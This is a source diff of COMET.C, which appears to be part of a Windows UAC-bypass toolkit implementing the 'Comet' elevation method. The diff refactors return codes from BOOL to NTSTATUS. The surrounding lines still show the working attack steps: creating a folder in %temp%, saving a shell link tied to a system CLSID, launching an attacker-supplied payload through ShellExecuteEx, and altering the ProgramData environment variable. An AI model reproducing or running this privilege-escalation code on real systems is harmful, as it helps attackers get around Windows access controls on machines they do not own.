@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.17
 *
-*  DATE:        25 Aug 2018
+*  DATE:        18 Mar 2019
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -34,7 +34,7 @@
 * Fixed in Windows 10 RS2
 *
 */
-BOOL ucmCometMethod(
+NTSTATUS ucmCometMethod(
     _In_ LPWSTR lpszPayload
 )
 {
@@ -44,7 +44,13 @@ BOOL ucmCometMethod(
 
     HRESULT hr_init;
 
-    BOOL    bCond = FALSE, bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL    bCond = FALSE;
     WCHAR   szCombinedPath[MAX_PATH * 2], szLinkFile[MAX_PATH * 3];
 
     IPersistFile    *persistFile = NULL;
@@ -53,16 +59,17 @@ BOOL ucmCometMethod(
     SHELLEXECUTEINFO  shinfo;
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+    if (g_ctx->IsWow64) {
+        Status = RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
     do {
 
         RtlSecureZeroMemory(szCombinedPath, sizeof(szCombinedPath));
-        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
+        _strcpy(szCombinedPath, g_ctx->szTempDirectory);
         _strcat(szCombinedPath, SOMEOTHERNAME);
         if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet
             if (GetLastError() != ERROR_ALREADY_EXISTS)
@@ -120,7 +127,7 @@ BOOL ucmCometMethod(
                 if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
                     persistFile->lpVtbl->Release(persistFile);
 
-                    _strcpy(szCombinedPath, g_ctx.szTempDirectory);
+                    _strcpy(szCombinedPath, g_ctx->szTempDirectory);
                     _strcat(szCombinedPath, SOMEOTHERNAME);
                     _strcpy(szLinkFile, szCombinedPath);
                     _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
@@ -135,7 +142,7 @@ BOOL ucmCometMethod(
                     shinfo.nShow = SW_SHOW;
                     if (ShellExecuteEx(&shinfo)) {
                         CloseHandle(shinfo.hProcess);
-                        bResult = TRUE;
+                        MethodResult = STATUS_SUCCESS;
                     }
                 }
             }
@@ -148,11 +155,11 @@ BOOL ucmCometMethod(
     } while (bCond);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
 
     supSetEnvVariable(TRUE, NULL, T_PROGRAMDATA, NULL);
-    return bResult;
+    return MethodResult;
 }
